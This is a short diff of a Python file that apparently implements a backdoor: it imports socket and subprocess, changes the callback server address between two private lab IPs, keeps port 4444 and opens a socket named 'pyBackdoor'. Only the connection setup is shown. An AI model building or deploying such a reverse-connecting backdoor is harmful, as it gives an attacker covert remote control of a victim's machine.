@@ -1,7 +1,7 @@
 import socket
 import subprocess
 
-Server_IP = '192.168.33.129'
+Server_IP = '192.168.33.174'
 PORT = 4444
 
 pyBackdoor = socket.socket()
